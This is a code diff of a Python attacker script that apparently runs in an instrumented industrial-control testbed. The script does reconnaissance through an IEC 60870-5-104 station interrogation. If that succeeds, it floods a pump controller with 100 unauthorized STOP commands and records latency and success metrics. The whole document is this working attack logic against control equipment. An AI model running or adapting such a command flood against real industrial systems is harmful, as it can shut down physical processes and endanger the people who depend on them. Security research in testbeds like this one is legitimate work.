@@ -58,21 +58,17 @@ def run_dnp3_attacker():
 
 		# Phase 1: Reconnaissance by triggering an integrity poll (GI equivalent).
 		print("[PHASE 1] Reconnaissance: trigger integrity poll...")
-		recon_start = time.time()
 		try:
 			gi_ok = connection.interrogation(
 				common_address=1,
 				cause=c104.Cot.ACTIVATION,
 				qualifier=c104.Qoi.STATION,
 			)
-			recon_latency = (time.time() - recon_start)
 			if gi_ok:
-				print(f" [+] Recon completed in {recon_latency:.2f}s")
-				push_metric("attack_recon", "recon_latency", recon_latency)
+				print(f" [+] Attacker triggered integrity poll successful.")
 				push_metric("attack_recon", "gi_ok", 1)
 			else:
-				print(f" [!] Recon failed in {recon_latency:.2f}s")
-				push_metric("attack_recon", "recon_latency", recon_latency)
+				print(f" [!] Attacker failed to trigger integrity poll.")
 				push_metric("attack_recon", "gi_ok", 0)
 		except Exception as e:
 			print(f" Recon exception: {e}")
@@ -80,31 +76,36 @@ def run_dnp3_attacker():
 		time.sleep(2)
 
 		# Phase 2: Unauthorized command flood (STOP pump) 100 times.
-		print("\n[PHASE 2] Flood attack: send STOP command (C_SC_NA_1, IOA 100) 100 times...")
-		success_count = 0
+		if (gi_ok):
+			print("\n[PHASE 2] Flood attack: send STOP command (C_SC_NA_1, IOA 100) 100 times...")
+			success_count = 0
 
-		for i in range(100):
-			try:
-				start_time = time.time()
-				pump_cmd.value = False  # STOP pump
-				ok = pump_cmd.transmit(cause=c104.Cot.ACTIVATION)
-				latency = (time.time() - start_time)
+			for i in range(100):
+				try:
+					start_time = time.time()
+					pump_cmd.value = False  # STOP pump
+					ok = pump_cmd.transmit(cause=c104.Cot.ACTIVATION)
+					latency = (time.time() - start_time) * 1000	# ms
 
-				push_metric("attack_write_flood", "latency", latency)
-				push_metric("attack_write_flood", "stop_cmd_value", 0)
+					push_metric("attack_write_flood", "latency", latency)
+					push_metric("attack_write_flood", "stop_cmd_value", 0)
 
-				if ok:
-					success_count += 1
-				else:
-					print(f" Write failed at attempt {i + 1}")
+					if ok:
+						success_count += 1
+					else:
+						print(f" Write failed at attempt {i + 1}")
 
-				time.sleep(0.05)
-			except Exception as e:
-				print(f" Write error at attempt {i + 1}: {e}")
+					time.sleep(0.05)
+				except Exception as e:
+					print(f" Write error at attempt {i + 1}: {e}")
 
-		print(f" [+] Phase 2 complete. Successful STOP commands: {success_count}/100")
-		print("--- END ATTACK CAMPAIGN. WAIT 30 SECONDS ---\n")
-		time.sleep(30)
+			print(f" [+] Phase 2 complete. Successful STOP commands: {success_count}/100 in {latency:.2f}ms")
+			print("--- END ATTACK CAMPAIGN. WAIT 30 SECONDS ---\n")
+			time.sleep(30)
+		else:
+			print(" [!] Skipping Phase 2 due to failed reconnaissance.")
+			print(" [+] Reattempting attack campaign after 15 seconds...\n")
+			time.sleep(15)
 
 
 if __name__ == "__main__":
